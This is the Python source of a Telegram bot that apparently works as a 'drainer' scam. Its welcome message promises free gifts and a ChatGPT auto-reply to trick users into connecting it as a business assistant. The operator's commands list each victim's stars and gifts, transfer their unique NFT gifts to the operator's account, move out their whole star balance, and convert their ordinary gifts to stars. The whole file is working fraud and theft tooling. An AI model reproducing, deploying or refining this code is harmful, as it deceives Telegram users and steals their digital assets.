from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars

from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
import gpt_answer

import aiogram.exceptions as exceptions
import logging
import asyncio
import json

import re

import config
import os

CONNECTIONS_FILE = "business_connections.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID
SENDER_ID = config.SENDER_ID

bot = Bot(token=TOKEN)
dp = Dispatcher()

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–æ—Ä–µ JSON-—Ñ–∞–π–ª–∞.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    # –ü—Ä–∏–º–µ—Ä: –∑–∞–≥—Ä—É–∂–∞–µ–º –∏–∑ —Ñ–∞–π–ª–∞ –∏–ª–∏ —Å–ª–æ–≤–∞—Ä—è
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #{user_id} –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞.")
    except Exception as e:
        logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–∏—á–Ω—ã–π —á–∞—Ç.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±—Ä–∞—Ç–Ω–æ
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(business_connection.user.id, "–ü—Ä–∏–≤–µ—Ç! –¢—ã –ø–æ–¥–∫–ª—é—á–∏–ª –º–æ–µ–≥–æ –±–æ—Ç–∞ –∫–∞–∫ –±–∏–∑–Ω–µ—Å-–∞—Å—Å–∏—Å—Ç–µ–Ω—Ç–∞.")

        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
        save_business_connection_data(business_connection)

        logging.info(f"–ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω: {business_connection.user.id}, connection_id: {business_connection}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")

@dp.business_message()
async def handler_message(message: Message):
    try:
        conn_id = message.business_connection_id
        sender_id = message.from_user.id
        msg_id = message.message_id

        connections = load_connections()
        connection = next((c for c in connections if c["business_connection_id"] == conn_id), None)

        if not connection:
            print(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –±–∏–∑–Ω–µ—Å connection_id: {conn_id}")
            return

        owner_id = connection["user_id"]

        if sender_id != owner_id:
            await bot.send_message(business_connection_id=message.business_connection_id,
                                chat_id=message.from_user.id, text=f"<b>–ü—Ä–∏–≤–µ—Ç! –Ø —Å–µ–π—á–∞—Å –æ—Ñ—Ñ–ª–∞–π–Ω, –ø–æ—ç—Ç–æ–º—É –∑–∞ –º–µ–Ω—è –æ—Ç–≤–µ—Ç–∏—Ç ChatGPT4:</b>\n\n{gpt_answer.generate(message.text)}", parse_mode="HTML")
    except Exception as e:
       logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–≤–µ—Ç–µ.")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        await message.answer("‚≠êÔ∏è –í—ã –ø–æ–ª—É—á–∏–ª–∏ 1 –ó–≤–µ–∑–¥—É –∑–∞ –∑–∞–ø—É—Å–∫ –±–æ—Ç–∞!")

        await message.answer("‚≠êÔ∏è")

        welcome_message = """
üéÅ <b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Telegram Gift Bot!</b>

‚ú® <i>–ü–æ–ª—É—á–∞–π—Ç–µ –±–µ—Å–ø–ª–∞—Ç–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –∏ –±–æ–Ω—É—Å—ã!</i> ‚ú®

–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:
1Ô∏è‚É£ –ü–æ–¥–∫–ª—é—á–∏—Ç–µ –º–µ–Ω—è –∫–∞–∫ –±–∏–∑–Ω–µ—Å-–±–æ—Ç–∞
2Ô∏è‚É£ –ü–æ–ª—É—á–∞–π—Ç–µ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏
3Ô∏è‚É£ –û–±–º–µ–Ω–∏–≤–∞–π—Ç–µ –∏—Ö –Ω–∞ —Å—Ç–∏–∫–µ—Ä—ã, –ø—Ä–µ–º–∏—É–º-—Å—Ç–∞—Ç—É—Å—ã –∏ –¥—Ä—É–≥–∏–µ –±–æ–Ω—É—Å—ã

–ù–∞—á–Ω–∏—Ç–µ –ø—Ä—è–º–æ —Å–µ–π—á–∞—Å - —è –±—É–¥—É –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–≤–µ—á–∞—Ç—å –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤–∞—à–∏—Ö –∫–ª–∏–µ–Ω—Ç–æ–≤, –∞ –≤—ã —Å–º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏!
        """

        await message.answer(welcome_message, parse_mode="HTML")

    else:
        await message.answer(f"Leisure Drainer\n\nüîó –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {count}\n\n/gifts - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≥–∏—Ñ—Ç—ã\n/stars - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–≤–µ–∑–¥—ã\n/transfer <owned_id> <business_connect> - –ø–µ—Ä–µ–¥–∞—Ç—å –≥–∏—Ñ—Ç –≤—Ä—É—á–Ω—É—é\n/convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã")

@dp.message(F.text.startswith("/transfer"))
async def transfer_gift_handler(message: Message, bot):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    
    try:
        args = message.text.strip().split()
        if len(args) != 3:
            return await message.answer("–ò—Å–ø–æ–ª—å–∑—É–π —Ñ–æ—Ä–º–∞—Ç: /transfer <owned_gift_id> <business_connection_id>")

        owned_gift_id = args[1]
        connection_id = args[2]
        if not connection_id:
            return await message.answer("‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")

        result = await bot(TransferGift(
            business_connection_id=connection_id,
            new_owner_chat_id=int(SENDER_ID),
            owned_gift_id=owned_gift_id,
            star_count=25
        ))

        await message.answer("‚úÖ –ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω —Ç–µ–±–µ!")

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except TelegramBadRequest as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏: {e.message}")
    except Exception as e:
        await message.answer(f"‚ö†Ô∏è –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")

@dp.message(F.text == "/gifts")
async def handle_gifts_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    try:
        with open("business_connections.json", "r") as f:
            connections = json.load(f)

        if not connections:
            await message.answer("–ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤.")
            return

        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username')} ({conn['user_id']})" or f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(
                text=name,
                callback_data=f"gifts:{user_id}"
            )

        await message.answer("–í—ã–±–µ—Ä–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:", reply_markup=kb.as_markup())

    except FileNotFoundError:
        await message.answer("–§–∞–π–ª –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –Ω–µ –Ω–∞–π–¥–µ–Ω.")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")
        await message.answer(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")

@dp.callback_query(F.data.startswith("gifts:"))
async def handle_gift_callback(callback: CallbackQuery):
    await callback.answer()

    user_id = int(callback.data.split(":", 1)[1])

    try:
        with open("business_connections.json", "r") as f:
            connections = json.load(f)

        connection = next((c for c in connections if c["user_id"] == user_id), None)

        if not connection:
            await callback.message.answer("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return

        business_connection_id = connection["business_connection_id"]

        star_balance = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        text = f"üÜî –ë–∏–∑–Ω–µ—Å –∫–æ–Ω–Ω–µ–∫—Ç: <b>{business_connection_id}</b>\n‚≠êÔ∏è –ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥: <b>{star_balance.star_amount}</b>\n\n"
        await callback.message.answer(text, parse_mode="HTML")

        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            text += "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."
            await callback.message.answer(text)
        else:
            for gift in gifts.gifts:
                if gift.type == "unique":
                    text = (
                        f"{gift.gift.base_name} #{gift.gift.number}\nOwner: #{user_id}\nOwnedGiftId: {gift.owned_gift_id}\n\n"
                        f"üéÅ <b>https://t.me/nft/{gift.gift.name}</b>\n"
                        f"üÜî –ú–æ–¥–µ–ª—å: <code>{gift.gift.model.name}</code>\n\n\n‚≠êÔ∏è –°—Ç–æ–∏–º–æ—Å—Ç—å —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä–∞: {gift.transfer_star_count} ‚≠êÔ∏è"
                    )
                    kb = InlineKeyboardMarkup(
                            inline_keyboard=[
                                [
                                    InlineKeyboardButton(
                                        text="üéÅ –ü–µ—Ä–µ–¥–∞—Ç—å –º–Ω–µ",
                                        callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:{gift.transfer_star_count}"
                                    )
                                ]
                            ]
                        )
                    await callback.message.answer(text, parse_mode="HTML", reply_markup=kb)
                    await asyncio.sleep(0.2)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –ø–æ –±–∏–∑–Ω–µ—Å—É")
        await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")

@dp.callback_query(F.data.startswith("transfer:"))
async def handle_transfer(callback: CallbackQuery):
    await callback.answer()

    if callback.from_user.id != ADMIN_ID:
        await callback.message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    try:
        _, user_id_str, gift_id, transfer_price = callback.data.split(":")
        user_id = int(user_id_str)

        with open("business_connections.json", "r") as f:
            connections = json.load(f)

        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return

        business_connection_id = connection["business_connection_id"]

        result = await bot(TransferGift(
            business_connection_id=business_connection_id,
            new_owner_chat_id=int(SENDER_ID),
            owned_gift_id=gift_id,
            star_count=transfer_price
        ))

        if result:
            await callback.message.answer("üéâ –ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω —Ç–µ–±–µ!")
        else:
            await callback.message.answer("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫.")

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ –ø–æ–¥–∞—Ä–∫–∞")
        await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")


@dp.message(F.text == "/stars")
async def show_star_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        await message.answer("‚ùå –ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π.")
        return

    if not connections:
        await message.answer("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.")
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})", callback_data=f"stars:{conn['user_id']}")]
        for conn in connections
    ])

    await message.answer("üîπ –í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –±–∞–ª–∞–Ω—Å–∞ –∑–≤—ë–∑–¥:", reply_markup=kb)

@dp.callback_query(F.data.startswith("stars:"))
async def show_user_star_balance(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    # –ó–∞–≥—Ä—É–∂–∞–µ–º –∫–æ–Ω–Ω–µ–∫—à–Ω
    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)

    conn = next((c for c in connections if c["user_id"] == user_id), None)
    if not conn:
        await callback.answer("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.", show_alert=True)
        return

    business_connection_id = conn["business_connection_id"]

    try:
        # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_count = response.star_amount

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="‚ú® –ü–µ—Ä–µ–¥–∞—Ç—å –∑–≤–µ–∑–¥—ã –º–Ω–µ", callback_data=f"transfer_stars:{business_connection_id}")]
        ])

        await callback.message.answer(f"‚≠ê <b>–£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {conn['first_name']} {conn['last_name'] or ''} ‚Äî {star_count} –∑–≤—ë–∑–¥.</b>", parse_mode="HTML", reply_markup=kb)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except TelegramBadRequest as e:
        await callback.message.answer(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞: {e.message}")

@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_to_admin(callback: CallbackQuery):
    business_connection_id = callback.data.split(":")[1]

    try:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_balance = response.star_amount

        result = await bot.transfer_business_account_stars(
            business_connection_id=business_connection_id,
            star_count=star_balance
        )
        if result:
            await callback.message.answer("‚úÖ –ó–≤–µ–∑–¥—ã —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω—ã –≤–∞–º.")
        else:
            await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥: {e.message}")
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except TelegramBadRequest as e:
        await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥: {e.message}")

async def convert_non_unique_gifts_to_stars(bot: Bot, business_connection_id: str) -> str:
    try:
        # –ü–æ–ª—É—á–∞–µ–º –ø–æ–¥–∞—Ä–∫–∏
        gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        gifts = gifts_response.gifts

        count = 0
        for gift in gifts:
            if gift.type != "unique":
                try:
                    await bot(ConvertGiftToStars(
                        business_connection_id=business_connection_id,
                        owned_gift_id=gift.gift.id
                    ))
                    count += 1
                except TelegramBadRequest as e:
                    if "GIFT_NOT_CONVERTIBLE" in str(e):
                        continue  # –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å–∫–∞–µ–º
                    else:
                        raise e  # –ø—Ä–æ–±—Ä–∞—Å—ã–≤–∞–µ–º –¥—Ä—É–≥–∏–µ –æ—à–∏–±–∫–∏

        if count == 0:
            return "–£ –≤–∞—Å –Ω–µ—Ç –æ–±—ã—á–Ω—ã—Ö (–Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö) –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏."
        return f"‚úÖ –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ {count} –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã."

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            return "‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø"
        return f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}"
    except Exception as e:
        return f"‚ùå –ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}"

@dp.message(F.text == "/convert")
async def convert_menu(message: Message):
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        return await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")

    if not connections:
        return await message.answer("–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π.")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})", callback_data=f"convert_select:{conn['user_id']}")]
        for conn in connections
    ])

    await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤:", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("convert_select:"))
async def convert_select_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)

    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="‚ôªÔ∏è –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –æ–±—ã—á–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã",
                    callback_data=f"convert_exec:{user_id}"
                )
            ]
        ]
    )

    await callback.message.edit_text(
        f"–í—ã–±—Ä–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{connection.get('username', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}",
        reply_markup=keyboard
    )

from aiogram.methods import GetBusinessAccountGifts, ConvertGiftToStars
from aiogram.exceptions import TelegramBadRequest
from aiogram.types import CallbackQuery
from aiogram import F

@dp.callback_query(F.data.startswith("convert_exec:"))
async def convert_exec_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception as e:
        return await callback.message.edit_text("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")

    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")

    try:
        # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        response = await bot(GetBusinessAccountGifts(
            business_connection_id=connection["business_connection_id"]
        ))
        gifts = response.gifts
    except TelegramBadRequest as e:
        return await callback.message.edit_text(f"–û—à–∏–±–∫–∞: {e.message}")
    
    if not gifts:
        return await callback.message.edit_text("üéÅ –£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤.")

    converted_count = 0
    failed = 0
    for gift in gifts:
        if gift.type == "unique":
            continue

        try:
            print(gift.gift.id)
            await bot(ConvertGiftToStars(
                business_connection_id=connection["business_connection_id"],
                owned_gift_id=str(gift.owned_gift_id)
            ))
            converted_count += 1
        except TelegramBadRequest as e:
            print(e)
            failed += 1
        except Exception as e:
            print(e)
            failed += 1

    await callback.message.edit_text(
        f"‚úÖ –£—Å–ø–µ—à–Ω–æ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ: {converted_count} –ø–æ–¥–∞—Ä–∫–æ–≤.\n"
        f"‚ùå –û—à–∏–±–æ–∫: {failed}"
    )

@dp.message(F.text == "/test")
async def test(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    await message.answer("–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞. –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!")

async def main():
    print("Made with love by @x_leisure_x")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
